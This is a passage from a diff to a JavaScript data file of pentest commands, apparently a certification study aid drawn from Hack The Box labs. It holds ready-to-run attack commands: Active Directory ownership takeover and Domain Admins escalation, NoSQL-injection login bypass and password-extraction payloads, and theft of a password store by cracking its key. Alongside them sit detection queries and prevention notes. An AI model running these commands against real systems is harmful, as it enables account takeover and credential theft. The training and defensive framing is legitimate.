+      "description": "With WriteOwner over a user or group, take ownership of the object so you can grant yourself any ACL (GenericAll, WriteDACL, etc.). impacket-owneredit modifies the nTSecurityDescriptor Owner SID via LDAP. Once you own the object, use bloodyAD or dacledit to add GenericAll, then Shadow Credentials or password reset to take the account.",
+      "platform": "linux",
+      "type": "command",
+      "opsec": "moderate",
+      "category": "Active Directory",
+      "subcategory": "ACL Abuse",
+      "certifications": [
+        "CRTP",
+        "CPTS"
+      ],
+      "primary_cert": "CRTP",
+      "source": "HTB TombWatcher engagement",
+      "tags": [
+        "writeowner",
+        "acl-abuse",
+        "owneredit",
+        "impacket",
+        "object-ownership",
+        "ad-acl"
+      ],
+      "mitre": [
+        "T1222.001"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== THE IDEA ===\nWriteOwner lets you change who OWNS an AD object. Once you are the owner you\ncan modify the DACL - granting yourself GenericAll, then pivoting via Shadow\nCredentials, password reset, or targeted Kerberoast.\n\n=== FULL CHAIN ===\n  1. Take ownership:  impacket-owneredit -action write -new-owner '<user>' -target '<target_account>' -dc-ip <dc_ip> '<domain>/<user>:<password>'\n  2. Grant GenericAll: bloodyAD --host <dc_ip> -d <domain> -u <user> -p <password> add genericAll '<target_account>' '<user>'\n  3. Pivot:            certipy-ad shadow auto -u <user>@<domain> -p <password> -account <target_account> -dc-ip <dc_ip>\n\n=== WITH NTLM HASH (pass-the-hash) ===\n  impacket-owneredit -action write -new-owner 'sam' -target 'john' -dc-ip <dc_ip> '<domain>/sam:NewPassword123!'\n\n=== RESTORE ORIGINAL OWNER ===\n  impacket-owneredit -action restore -target '<target_account>' -dc-ip <dc_ip> '<domain>/<user>:<password>'\n  (requires the backup file from the write action)\n\n=== CLEANUP ===\nAlways restore original ownership after the engagement - leaving yourself as\nowner of a DA account is an obvious IOC.",
+      "examples": [
+        {
+          "label": "Take ownership of a user object",
+          "command": "impacket-owneredit -action write -new-owner 'sam' -target 'john' -dc-ip 10.129.232.167 'tombwatcher.htb/sam:NewPassword123!'"
+        },
+        {
+          "label": "Chain: grant GenericAll after ownership",
+          "command": "bloodyAD --host <dc_ip> -d <domain> -u <user> -p <password> add genericAll '<target_account>' '<user>'"
+        },
+        {
+          "label": "Chain: Shadow Credentials to get NT hash",
+          "command": "certipy-ad shadow auto -u <user>@<domain> -p <password> -account <target_account> -dc-ip <dc_ip>"
+        }
+      ],
+      "references": [
+        {
+          "title": "impacket-owneredit",
+          "url": "https://github.com/fortra/impacket"
+        },
+        {
+          "title": "The Hacker Recipes - WriteOwner",
+          "url": "https://www.thehacker.recipes/ad/movement/dacl/write-owner"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "ad-bloodyad-toolkit",
+          "note": "After taking ownership, bloodyAD grants GenericAll to complete the chain.",
+          "rel": "next"
+        },
+        {
+          "id": "ad-shadow-credentials",
+          "note": "Shadow Credentials is the cleanest pivot once you have GenericAll.",
+          "rel": "next"
+        }
+      ],
+      "defense": {
+        "why_it_works": "WriteOwner permission lets the attacker change the nTSecurityDescriptor Owner field. The object owner has implicit WriteDACL, allowing arbitrary ACE additions. This is a built-in Windows access control mechanism, not a bug.",
+        "prerequisites": "WriteOwner permission over the target object (visible in BloodHound as a WriteOwner edge).",
+        "impact": "Full control of the target object - password reset, Shadow Credentials, DCSync if the target has replication rights.",
+        "detection": "[MITRE T1222.001] Event 4670 (permissions change) on the target object with Owner SID modified; Event 5136 modifying nTSecurityDescriptor.",
+        "artifacts": "4670 owner change event; 5136 DACL modification; impacket-owneredit backup file on attacker disk.",
+        "splunk_spl": "index=wineventlog sourcetype=\"WinEventLog:Security\" EventCode=4670\n| where isnotnull(NewSd) AND isnotnull(OldSd)\n| table _time, SubjectUserName, ObjectName, ObjectType, ProcessName",
+        "elastic_kql": "event.code:\"4670\" AND winlog.event_data.ObjectType:\"user\"",
+        "sentinel_kql": "SecurityEvent\n| where EventID == 4670\n| project TimeGenerated, Actor=SubjectUserName, Target=ObjectName, ObjectType\n| where ObjectType contains \"user\" or ObjectType contains \"group\"",
+        "sigma_rules": "win_security_object_owner_changed",
+        "prevention": "Audit and minimize WriteOwner ACEs in AD; alert on 4670 events where the Owner SID changes to a non-admin principal; use AdminSDHolder to protect sensitive accounts.",
+        "sources": [
+          "HTB TombWatcher",
+          "https://attack.mitre.org/techniques/T1222/001/"
+        ],
+        "detections": [
+          {
+            "platform": "sentinel",
+            "name": "AD object ownership takeover",
+            "logic": "SecurityEvent\n| where EventID == 4670\n| extend NewOwner = extract(@'O:(.+?)D:', 1, NewSd)\n| where NewOwner != extract(@'O:(.+?)D:', 1, OldSd)\n| project TimeGenerated, Actor=SubjectUserName, Target=ObjectName, NewOwner",
+            "data_source": "windows-security",
+            "log_ids": [
+              "4670"
+            ],
+            "attack": [
+              "T1222.001"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "high",
+            "false_positives": "Legitimate AD administration changing object ownership during delegation setup",
+            "tuning": "Baseline normal owner-change activity; alert on ownership changes to sensitive accounts (adminCount=1)"
+          }
+        ]
+      }
     },
     {
       "id": "crtp-loader",
@@ -100364,6 +100954,80 @@ const COMMAND_DATA = {
       "explain": "Checks whether a domain is vulnerable to NoPac (CVE-2021-42278 + CVE-2021-42287) with only LDAP queries:\n  scanner.py <domain>/<user>:<password>   authenticate as any domain user\n  -dc-ip <dc_ip>   the Domain Controller to test\n  -use-ldap        query over LDAP (quiet - no exploitation)\nPrints the domain SID and confirms if the DC can be impersonated; run it before noPac.py so you only fire the exploit against a confirmed-vulnerable DC."
     },
     {
+      "id": "nosql-injection-bypass",
+      "name": "NoSQL Injection - MongoDB Operator Bypass",
+      "command": "curl -X POST http://<target>/login -H 'Content-Type: application/json' -d '{\"username\":{\"$ne\":\"\"},\"password\":{\"$ne\":\"\"}}'",
+      "description": "NoSQL injection exploits MongoDB query operators ($ne, $gt, $regex, $where) passed through unsanitized JSON input. Unlike SQL injection, there are no tables to UNION - instead you bypass authentication, enumerate users, or extract data by manipulating the query logic. Common in Node.js/Express apps using MongoDB with body-parser.",
+      "platform": "linux",
+      "type": "command",
+      "opsec": "quiet",
+      "category": "Web",
+      "subcategory": "Injection",
+      "certifications": [
+        "OSCP",
+        "CWES",
+        "CPTS"
+      ],
+      "primary_cert": "CWES",
+      "source": "HTB BSides Amman CTF",
+      "tags": [
+        "nosql",
+        "mongodb",
+        "injection",
+        "authentication-bypass",
+        "operator-injection",
+        "json"
+      ],
+      "mitre": [
+        "T1190"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== AUTH BYPASS ===\n  # $ne (not equal) - matches any non-empty username AND password\n  curl -X POST http://<target>/login -H 'Content-Type: application/json' \\\n    -d '{\"username\":{\"$ne\":\"\"},\"password\":{\"$ne\":\"\"}}'\n\n=== USER ENUMERATION WITH $regex ===\n  # Enumerate users starting with 'a'\n  curl -X POST http://<target>/login -H 'Content-Type: application/json' \\\n    -d '{\"username\":{\"$regex\":\"^a\"},\"password\":{\"$ne\":\"\"}}'\n  # Iterate: ^a, ^b, ^ad, ^adm, ^admin... to extract full usernames\n\n=== PASSWORD EXTRACTION WITH $regex ===\n  curl -X POST http://<target>/login -H 'Content-Type: application/json' \\\n    -d '{\"username\":\"admin\",\"password\":{\"$regex\":\"^p\"}}'\n  # Same character-by-character extraction for the password\n\n=== $gt BYPASS ===\n  curl -X POST http://<target>/login -H 'Content-Type: application/json' \\\n    -d '{\"username\":{\"$gt\":\"\"},\"password\":{\"$gt\":\"\"}}'\n\n=== PHP FORM-BASED ===\n  # If the app uses PHP with form data instead of JSON:\n  curl -X POST http://<target>/login \\\n    -d 'username[$ne]=&password[$ne]='\n\n=== COMMON INDICATORS ===\n- Node.js + Express + MongoDB stack\n- JSON body in login requests\n- Error messages mentioning MongoError or BSON",
+      "examples": [
+        {
+          "label": "Auth bypass with $ne operator",
+          "command": "curl -X POST http://<target>/login -H 'Content-Type: application/json' -d '{\"username\":{\"$ne\":\"\"},\"password\":{\"$ne\":\"\"}}'"
+        },
+        {
+          "label": "Enumerate usernames with $regex",
+          "command": "curl -X POST http://<target>/login -H 'Content-Type: application/json' -d '{\"username\":{\"$regex\":\"^a\"},\"password\":{\"$ne\":\"\"}}'"
+        },
+        {
+          "label": "PHP form-based NoSQL injection",
+          "command": "curl -X POST http://<target>/login -d 'username[$ne]=&password[$ne]='"
+        },
+        {
+          "label": "Auth bypass with $gt operator",
+          "command": "curl -X POST http://<target>/login -H 'Content-Type: application/json' -d '{\"username\":{\"$gt\":\"\"},\"password\":{\"$gt\":\"\"}}'"
+        }
+      ],
+      "references": [
+        {
+          "title": "HackTricks - NoSQL Injection",
+          "url": "https://book.hacktricks.wiki/en/pentesting-web/nosql-injection.html"
+        },
+        {
+          "title": "PayloadsAllTheThings - NoSQL",
+          "url": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection"
+        }
+      ],
+      "defense": {
+        "why_it_works": "MongoDB query operators ($ne, $gt, $regex) are valid JSON keys that the driver interprets as query conditions. If the app passes user input directly into a MongoDB find() query without sanitization, the operators modify the query logic.",
+        "prerequisites": "A web app that passes JSON input directly into MongoDB queries without sanitization.",
+        "impact": "Authentication bypass, user enumeration, data extraction, and in some cases remote code execution via $where.",
+        "detection": "[MITRE T1190] Web application logs showing MongoDB operator characters in input fields; WAF/IDS rules matching $ne, $gt, $regex, $where in request bodies.",
+        "artifacts": "HTTP request logs with JSON bodies containing MongoDB operators; application-level audit logs.",
+        "splunk_spl": "index=web sourcetype=access_combined\n| where match(request_body, \"\\$ne|\\$gt|\\$regex|\\$where\")\n| table _time, src_ip, uri_path, request_body",
+        "elastic_kql": "http.request.body.content:(*$ne* OR *$gt* OR *$regex* OR *$where*)",
+        "sentinel_kql": "W3CIISLog\n| where csUriQuery contains \"$ne\" or csUriQuery contains \"$gt\" or csUriQuery contains \"$regex\"\n| project TimeGenerated, cIP, csUriStem, csUriQuery",
+        "prevention": "Use mongoose schema validation; sanitize input with mongo-sanitize or express-mongo-sanitize; never pass raw user input into MongoDB queries; use parameterized queries.",
+        "sources": [
+          "HTB BSides Amman CTF",
+          "https://attack.mitre.org/techniques/T1190/"
+        ]
+      }
+    },
+    {
       "id": "cdsa-m07-nta-workflow",
       "name": "NTA Analysis Workflow - Descriptive, Diagnostic, Predictive, Prescriptive",
       "command": "sudo tcpdump -i eth0 -w /tmp/capture.pcap",
@@ -100461,6 +101125,178 @@ const COMMAND_DATA = {
         }
       ],
       "explain": "Network Traffic Analysis (NTA) follows a 4-phase framework: Descriptive (what happened), Diagnostic (why it happened), Predictive (what might happen), Prescriptive (what to do).\nThe 8-step practical workflow covers everything from capture setup to IOC extraction.\n=== NTA ANALYSIS FRAMEWORK (4 PHASES) ===\n\n[1] Descriptive Analysis\n   What happened?\n   Identify: what traffic occurred, which hosts communicated, what data was exchanged\n   Tools: tcpdump, Wir..."
+    },
+    {
+      "id": "ntfs-ads-hidden-streams",
+      "name": "NTFS Alternate Data Streams (ADS) - Hidden File Content",
+      "command": "dir /r",
+      "description": "NTFS Alternate Data Streams (ADS) allow storing additional data streams alongside a file's default $DATA stream. Attackers and CTF authors hide flags, credentials, or payloads in ADS. A normal 'dir' or 'type' won't show them - you need 'dir /r' to list streams and 'more <' or PowerShell to read them.",
+      "platform": "windows",
+      "type": "command",
+      "opsec": "silent",
+      "category": "Post-Exploitation",
+      "subcategory": "Data Discovery",
+      "certifications": [
+        "OSCP",
+        "CPTS"
+      ],
+      "primary_cert": "OSCP",
+      "source": "HTB Jeeves engagement",
+      "tags": [
+        "ntfs",
+        "ads",
+        "alternate-data-streams",
+        "hidden-files",
+        "windows-forensics",
+        "data-hiding"
+      ],
+      "mitre": [
+        "T1564.004"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== DISCOVERY ===\n  dir /r                          # List ALL streams (ADS show as filename:streamname:$DATA)\n  dir /r C:\\Users\\*\\Desktop\\      # Check user desktops\n\n=== READING ADS ===\n  more < hm.txt:root.txt          # Read the 'root.txt' stream hidden inside hm.txt\n  more < hm.txt:root.txt:$DATA    # Explicit $DATA stream reference\n  # 'type' does NOT work with ADS - use 'more <'\n\n=== POWERSHELL ===\n  Get-Item -Path hm.txt -Stream *                     # List all streams\n  Get-Content -Path hm.txt -Stream root.txt           # Read a specific stream\n  Get-ChildItem -Recurse | ForEach-Object { Get-Item $_.FullName -Stream * } 2>$null  # Recursive scan\n\n=== CREATING ADS (for testing/understanding) ===\n  echo 'hidden content' > normal.txt:secret.txt       # Write to ADS\n  notepad normal.txt:secret.txt                       # Open ADS in notepad\n\n=== EXTRACTING FILES FROM ADS ===\n  # ADS can hide executables, not just text:\n  expand filename.txt:hidden.exe hidden.exe            # Extract hidden exe\n  # Or with PowerShell:\n  Get-Content filename.txt -Stream hidden.exe -Encoding Byte | Set-Content hidden.exe -Encoding Byte\n\n=== WHERE TO LOOK ===\n- User desktops (flag hiding in CTFs)\n- Temp directories\n- Application data\n- Downloaded files (Zone.Identifier stream marks downloads)",
+      "examples": [
+        {
+          "label": "List all alternate data streams",
+          "command": "dir /r C:\\Users\\Administrator\\Desktop\\"
+        },
+        {
+          "label": "Read hidden stream from a file",
+          "command": "more < hm.txt:root.txt"
+        },
+        {
+          "label": "PowerShell - list all streams on a file",
+          "command": "Get-Item -Path hm.txt -Stream *"
+        },
+        {
+          "label": "PowerShell - read a specific ADS",
+          "command": "Get-Content -Path hm.txt -Stream root.txt"
+        }
+      ],
+      "references": [
+        {
+          "title": "Microsoft - NTFS Alternate Data Streams",
+          "url": "https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-fscc/e2d05f50-e8c4-4e12-b357-169cdca67c78"
+        },
+        {
+          "title": "MITRE T1564.004 - Hide Artifacts: NTFS File Attributes",
+          "url": "https://attack.mitre.org/techniques/T1564/004/"
+        }
+      ],
+      "defense": {
+        "why_it_works": "NTFS supports multiple named data streams per file. The default stream ($DATA) is what normal tools show. Additional streams are invisible to dir, type, and most file managers, making them effective for hiding data.",
+        "prerequisites": "NTFS filesystem; access to the file containing the ADS.",
+        "impact": "Discovery of hidden credentials, flags, or payloads that standard enumeration misses.",
+        "detection": "[MITRE T1564.004] Sysmon Event 15 (FileCreateStreamHash) logs ADS creation; dir /r or streams.exe in command history.",
+        "artifacts": "Sysmon Event 15 for stream creation; PowerShell script block logs showing Get-Item -Stream; command history with 'dir /r'.",
+        "splunk_spl": "index=sysmon EventCode=15\n| where NOT match(TargetFilename, \"Zone\\.Identifier\")\n| table _time, Image, TargetFilename, Hash",
+        "elastic_kql": "event.code:\"15\" AND NOT file.name:*Zone.Identifier*",
+        "sentinel_kql": "SysmonEvent\n| where EventID == 15\n| where TargetFilename !contains \"Zone.Identifier\"\n| project TimeGenerated, Image, TargetFilename, Hashes",
+        "sigma_rules": "sysmon_ads_creation",
+        "prevention": "Monitor Sysmon Event 15 for ADS creation (exclude Zone.Identifier); use streams.exe (Sysinternals) for periodic ADS audits; restrict write access to sensitive directories.",
+        "sources": [
+          "HTB Jeeves",
+          "https://attack.mitre.org/techniques/T1564/004/"
+        ],
+        "detections": [
+          {
+            "platform": "sentinel",
+            "name": "NTFS Alternate Data Stream creation (non-ZoneIdentifier)",
+            "logic": "SysmonEvent\n| where EventID == 15\n| where TargetFilename !contains \"Zone.Identifier\"\n| project TimeGenerated, Image, TargetFilename, Hashes\n| sort by TimeGenerated desc",
+            "data_source": "sysmon",
+            "log_ids": [
+              "15"
+            ],
+            "attack": [
+              "T1564.004"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "medium",
+            "false_positives": "Some applications legitimately use ADS for metadata storage",
+            "tuning": "Exclude known legitimate ADS users; focus on ADS in user-writable directories"
+          }
+        ]
+      }
+    },
+    {
+      "id": "nuclei-vuln-scan",
+      "name": "Nuclei - Template-Based Vulnerability Scanner",
+      "command": "nuclei -u https://<target> -severity info,low,medium,high,critical -rl 40 -o web_nuclei.txt",
+      "description": "Nuclei is a fast template-based vulnerability scanner. It runs community-maintained templates against a target to detect misconfigurations, deprecated TLS, exposed panels, CVEs, and more. Use it as the VA (Vulnerability Assessment) engine after content discovery - it catches what manual checks miss, and each finding points to a specific template for verification.",
+      "platform": "linux",
+      "type": "command",
+      "opsec": "moderate",
+      "category": "Web",
+      "subcategory": "Vulnerability Scanning",
+      "certifications": [
+        "OSCP",
+        "CPTS"
+      ],
+      "primary_cert": "CPTS",
+      "source": "HTU engagement playbook",
+      "tags": [
+        "nuclei",
+        "vulnerability-scanner",
+        "web-scanning",
+        "va",
+        "templates",
+        "cve-detection"
+      ],
+      "mitre": [
+        "T1595.002"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== BASIC SCAN ===\n  nuclei -u https://<target> -severity info,low,medium,high,critical -rl 40 -o web_nuclei.txt\n  # -rl 40 = rate limit 40 requests/sec (be polite to prod)\n\n=== SCAN MULTIPLE TARGETS ===\n  nuclei -l targets.txt -severity medium,high,critical -rl 30 -o bulk_nuclei.txt\n\n=== SCAN SPECIFIC TEMPLATE TAGS ===\n  nuclei -u https://<target> -tags cve,misconfig,exposure -o tagged.txt\n\n=== SCAN FOR A SPECIFIC CVE ===\n  nuclei -u https://<target> -t cves/2021/ -id CVE-2021-44228 -o log4j.txt\n\n=== UPDATE TEMPLATES ===\n  nuclei -ut   # update to latest community templates\n\n=== VERIFY FINDINGS MANUALLY ===\nNuclei can false-positive. Always verify:\n  - Deprecated TLS: openssl s_client -connect <target>:443 -tls1\n  - Exposed panel: curl the URL and confirm\n  - CVE: read the template and reproduce manually\n\n=== COMMON FINDINGS ===\n- TLS 1.0/1.1 + CBC ciphers (deprecated crypto - low finding, easy win)\n- Missing security headers (CSP, HSTS, X-Frame-Options)\n- Exposed admin panels, .git directories, server-status\n- Known CVEs matching detected technology stack",
+      "examples": [
+        {
+          "label": "Full severity scan with rate limit",
+          "command": "nuclei -u https://target.htb -severity info,low,medium,high,critical -rl 40 -o web_nuclei.txt"
+        },
+        {
+          "label": "Scan from a target list",
+          "command": "nuclei -l targets.txt -severity medium,high,critical -rl 30 -o bulk_nuclei.txt"
+        },
+        {
+          "label": "Scan for specific CVE templates",
+          "command": "nuclei -u https://target.htb -tags cve -severity high,critical -o cve_scan.txt"
+        },
+        {
+          "label": "Update nuclei templates",
+          "command": "nuclei -ut"
+        }
+      ],
+      "references": [
+        {
+          "title": "Nuclei - ProjectDiscovery",
+          "url": "https://github.com/projectdiscovery/nuclei"
+        },
+        {
+          "title": "Nuclei Templates",
+          "url": "https://github.com/projectdiscovery/nuclei-templates"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "feroxbuster-recursive",
+          "note": "Run feroxbuster first for content discovery, then nuclei for vulnerability scanning.",
+          "rel": "prereq"
+        }
+      ],
+      "defense": {
+        "why_it_works": "Nuclei sends crafted requests matching known vulnerability patterns. Each template encodes a specific check (request + response matcher). It detects misconfigurations and known CVEs by pattern matching responses.",
+        "prerequisites": "HTTP(S) access to the target; nuclei installed with up-to-date templates.",
+        "impact": "Identifies exploitable vulnerabilities, misconfigurations, and information disclosures.",
+        "detection": "[MITRE T1595.002] Web server logs showing rapid automated requests with nuclei user-agent; IDS/WAF signatures for known nuclei template payloads.",
+        "artifacts": "Web server access logs with nuclei user-agent string; nuclei output files.",
+        "splunk_spl": "index=web sourcetype=access_combined useragent=\"*nuclei*\"\n| stats count by src_ip, uri_path\n| sort -count",
+        "elastic_kql": "user_agent.original:*nuclei*",
+        "sentinel_kql": "W3CIISLog\n| where csUserAgent contains \"nuclei\"\n| summarize RequestCount=count() by cIP, csUriStem\n| sort by RequestCount desc",
+        "prevention": "WAF rules blocking known scanner user-agents; rate limiting; keeping software patched to eliminate the vulnerabilities nuclei finds.",
+        "sources": [
+          "HTU engagement playbook",
+          "https://attack.mitre.org/techniques/T1595/002/"
+        ]
+      }
     },
     {
       "id": "cdsa-m06-object-acls",
@@ -103698,6 +104534,179 @@ const COMMAND_DATA = {
         "pth"
       ],
       "explain": "Pass-the-hash to an SMB share with smbclient - no cracking needed:\n  smbclient \\\\\\\\<target>\\\\<share>   connect to the share\n  -U <domain>/<user>       the account\n  --pw-nt-hash <nt_hash>   treat the supplied string as an NT hash, not a plaintext password\nAdd -c 'ls'/'get'/'put' to list or transfer files non-interactively; impacket-psexec/wmiexec and crackmapexec accept the same hash for execution and share enumeration."
+    },
+    {
+      "id": "passpie-credential-theft",
+      "name": "Passpie - Credential Store Exfiltration",
+      "command": "passpie export ~/passwords.db",
+      "description": "Passpie is a command-line password manager that stores credentials as PGP-encrypted YAML files. If you find a .passpie directory on a target, you can extract the PGP private key (.keys), crack its passphrase with gpg2john+john, then export all stored credentials in cleartext. Common privesc path: user's passpie store contains root SSH password.",
+      "platform": "linux",
+      "type": "command",
+      "opsec": "silent",
+      "category": "Post-Exploitation",
+      "subcategory": "Credential Theft",
+      "certifications": [
+        "OSCP"
+      ],
+      "primary_cert": "OSCP",
+      "source": "HTB MetaTwo engagement",
+      "tags": [
+        "passpie",
+        "password-manager",
+        "credential-theft",
+        "pgp",
+        "privesc",
+        "yaml"
+      ],
+      "mitre": [
+        "T1555"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== THE CHAIN ===\n  1. Find passpie:  ls -la ~/.passpie/   # look for .keys + ssh/*.pass files\n  2. Get the key:   cat ~/.passpie/.keys  # PGP public+private key block\n  3. Transfer key:  scp user@target:~/.passpie/.keys ./keys\n  4. Crack it:      gpg2john keys > keys.hash\n                    john --wordlist=/usr/share/wordlists/rockyou.txt keys.hash --format=gpg\n  5. Export creds:  passpie export ~/passwords.db  # enter cracked passphrase\n  6. Read creds:    cat ~/passwords.db  # YAML with cleartext passwords\n\n=== STRUCTURE ===\n  ~/.passpie/\n    .config       # passpie config\n    .keys         # PGP public + private key pair\n    ssh/          # credential category folder\n      root.pass   # PGP-encrypted credential for root@ssh\n      user.pass   # PGP-encrypted credential for user@ssh\n\n=== EXPORTED FORMAT ===\n  credentials:\n  - fullname: root@ssh\n    login: root\n    password: !!python/unicode 'p7qfAZt4_A1xo_0x'\n  - fullname: jnelson@ssh\n    login: jnelson\n    password: !!python/unicode 'Cb4_JmWM8zUZWMu@Ys'\n\n=== NOTES ===\n- If passpie is not installed on your box, you can manually:\n  gpg --import keys\n  gpg --decrypt root.pass\n- The .keys file contains BOTH public and private key\n- The passphrase is typically weak (it's a personal tool)",
+      "examples": [
+        {
+          "label": "Enumerate passpie store",
+          "command": "ls -la ~/.passpie/ && ls ~/.passpie/ssh/"
+        },
+        {
+          "label": "Export credentials after cracking GPG passphrase",
+          "command": "passpie export ~/passwords.db && cat ~/passwords.db"
+        },
+        {
+          "label": "View a single encrypted credential",
+          "command": "cat ~/.passpie/ssh/root.pass"
+        }
+      ],
+      "references": [
+        {
+          "title": "Passpie - Command-line Password Manager",
+          "url": "https://github.com/marcwebbie/passpie"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "gpg2john-pgp-crack",
+          "note": "gpg2john extracts the hash from .keys; john cracks the passphrase needed for export.",
+          "rel": "prereq"
+        }
+      ],
+      "defense": {
+        "why_it_works": "Passpie stores credentials encrypted with a PGP key whose private key sits in the same directory (.keys). If the passphrase is weak, the entire store is compromised.",
+        "prerequisites": "Read access to the user's .passpie directory; ability to crack the PGP passphrase offline.",
+        "impact": "All credentials stored in passpie exposed in cleartext - often includes root SSH password, service accounts, API keys.",
+        "detection": "[MITRE T1555] File access to .passpie directory; passpie export command in bash history; gpg2john execution.",
+        "artifacts": "Access to .passpie/.keys in audit logs; passpie export in .bash_history; exported passwords.db file.",
+        "splunk_spl": "index=linux sourcetype=linux:audit name=\".passpie\" OR name=\".keys\" OR name=\"*.pass\"\n| table _time, user, name, key, success",
+        "elastic_kql": "file.path:*\\.passpie* AND event.action:\"opened-for-read\"",
+        "sentinel_kql": "Syslog\n| where SyslogMessage contains \".passpie\" or SyslogMessage contains \"passpie export\"\n| project TimeGenerated, Computer, SyslogMessage",
+        "prevention": "Use a password manager with stronger encryption (KeePassXC with a keyfile); use hardware-backed keys; restrict .passpie permissions; use long random passphrases for PGP keys.",
+        "sources": [
+          "HTB MetaTwo",
+          "https://attack.mitre.org/techniques/T1555/"
+        ]
+      }
+    },
+    {
+      "id": "ad-passthecert",
+      "name": "PassTheCert (Certificate-Based LDAP Shell)",
+      "command": "python3 passthecert.py -action ldap-shell -crt <cert_file>.crt -key <key_file>.key -domain <domain> -dc-ip <dc_ip>",
+      "description": "When you have a certificate (PFX/CRT+KEY) but PKINIT authentication fails (e.g. the cert lacks Client Authentication EKU, or the KDC rejects it), PassTheCert authenticates to LDAP using the certificate via Schannel/LDAPS. This gives you an interactive LDAP shell where you can add users to groups, reset passwords, or perform any LDAP operation as the certificate's identity.",
+      "platform": "linux",
+      "type": "command",
+      "opsec": "moderate",
+      "category": "Active Directory",
+      "subcategory": "ADCS Attacks",
+      "certifications": [
+        "CRTP",
+        "CPTS"
+      ],
+      "primary_cert": "CRTP",
+      "source": "HTB TombWatcher engagement; AlmondOffSec PassTheCert",
+      "tags": [
+        "adcs",
+        "passthecert",
+        "certificate",
+        "ldap-shell",
+        "schannel",
+        "pkinit-bypass"
+      ],
+      "mitre": [
+        "T1649"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== THE IDEA ===\nPKINIT (Kerberos) requires the cert to have Client Authentication EKU.\nIf it only has Server Authentication (e.g. from ESC15/WebServer template),\ncertipy-ad auth will fail. PassTheCert bypasses this by authenticating\nto LDAP over TLS (Schannel) where EKU is not enforced the same way.\n\n=== SPLIT PFX INTO CRT + KEY ===\n  certipy-ad cert -pfx administrator.pfx -nokey -out administrator.crt\n  certipy-ad cert -pfx administrator.pfx -nocert -out administrator.key\n\n=== LAUNCH LDAP SHELL ===\n  python3 passthecert.py -action ldap-shell \\\n    -crt administrator.crt -key administrator.key \\\n    -domain <domain> -dc-ip <dc_ip>\n\n=== LDAP SHELL COMMANDS ===\n  add_user_to_group <user> Administrators\n  add_user_to_group <user> 'Domain Admins'\n  set_password <user> <new_password>\n  add_computer <computer_name>\n  del_computer <computer_name>\n\n=== ALTERNATIVE ACTIONS ===\n  -action modify-user  (set a UPN for S4U2Self)\n  -action add-computer (add a machine account)\n  -action whoami       (verify the authenticated identity)\n\n=== INSTALL ===\n  git clone https://github.com/AlmondOffSec/PassTheCert.git\n  cd PassTheCert/Python",
+      "examples": [
+        {
+          "label": "Split PFX into cert and key",
+          "command": "certipy-ad cert -pfx administrator.pfx -nokey -out administrator.crt && certipy-ad cert -pfx administrator.pfx -nocert -out administrator.key"
+        },
+        {
+          "label": "LDAP shell with certificate",
+          "command": "python3 passthecert.py -action ldap-shell -crt administrator.crt -key administrator.key -domain tombwatcher.htb -dc-ip 10.129.232.167"
+        },
+        {
+          "label": "Add user to Domain Admins via LDAP shell",
+          "command": "add_user_to_group john 'Domain Admins'"
+        }
+      ],
+      "references": [
+        {
+          "title": "PassTheCert - AlmondOffSec",
+          "url": "https://github.com/AlmondOffSec/PassTheCert"
+        },
+        {
+          "title": "The Hacker Recipes - PassTheCert",
+          "url": "https://www.thehacker.recipes/ad/movement/kerberos/pass-the-certificate"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "ad-esc15-ekuwu",
+          "note": "ESC15 gets you the certificate; PassTheCert uses it when PKINIT fails.",
+          "rel": "prereq"
+        },
+        {
+          "id": "ad-certipy-toolkit",
+          "note": "certipy-ad cert splits the PFX; certipy-ad auth is the first attempt before falling back to PassTheCert.",
+          "rel": "prereq"
+        }
+      ],
+      "defense": {
+        "why_it_works": "Schannel (TLS client certificate authentication to LDAP) does not enforce EKU restrictions the same way PKINIT does. A certificate with only Server Authentication EKU can still authenticate to LDAPS, granting the attacker an LDAP session as the certificate's subject.",
+        "prerequisites": "A valid certificate (PFX or CRT+KEY) issued by the domain's CA, even without Client Authentication EKU; LDAPS must be available (port 636).",
+        "impact": "Authenticated LDAP session as the certificate's identity - can modify group membership, reset passwords, add computers.",
+        "detection": "[MITRE T1649] LDAPS connection using certificate authentication (Event 4624 with AuthPackage=Schannel); Group membership changes (4728/4756) shortly after.",
+        "artifacts": "4624 Schannel logon event; 4728/4756 group membership changes; CRT and KEY files on attacker disk.",
+        "splunk_spl": "index=wineventlog sourcetype=\"WinEventLog:Security\" EventCode=4624 AuthenticationPackageName=\"Schannel\"\n| table _time, TargetUserName, IpAddress, CertificateIssuerName",
+        "elastic_kql": "event.code:\"4624\" AND winlog.event_data.AuthenticationPackageName:\"Schannel\"",
+        "sentinel_kql": "SecurityEvent\n| where EventID == 4624 and AuthenticationPackageName == \"Schannel\"\n| project TimeGenerated, Account=TargetUserName, IpAddress, CertIssuer=CertificateIssuerName",
+        "sigma_rules": "win_security_schannel_certificate_logon",
+        "prevention": "Disable LDAPS if not required; monitor Schannel logon events; require Client Authentication EKU in all user-facing templates; patch vulnerable templates.",
+        "sources": [
+          "HTB TombWatcher",
+          "https://attack.mitre.org/techniques/T1649/"
+        ],
+        "detections": [
+          {
+            "platform": "sentinel",
+            "name": "Schannel certificate authentication to LDAP",
+            "logic": "SecurityEvent\n| where EventID == 4624 and AuthenticationPackageName == \"Schannel\"\n| project TimeGenerated, Account=TargetUserName, IpAddress, CertIssuer=CertificateIssuerName\n| join kind=leftouter (\n    SecurityEvent | where EventID in (4728, 4756)\n    | project GroupChangeTime=TimeGenerated, GroupName=TargetUserName, MemberAdded=MemberName\n) on $left.Account == $right.MemberAdded\n| sort by TimeGenerated desc",
+            "data_source": "windows-security",
+            "log_ids": [
+              "4624",
+              "4728",
+              "4756"
+            ],
+            "attack": [
+              "T1649"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "high",
+            "false_positives": "Legitimate smart card or certificate-based LDAP authentication",
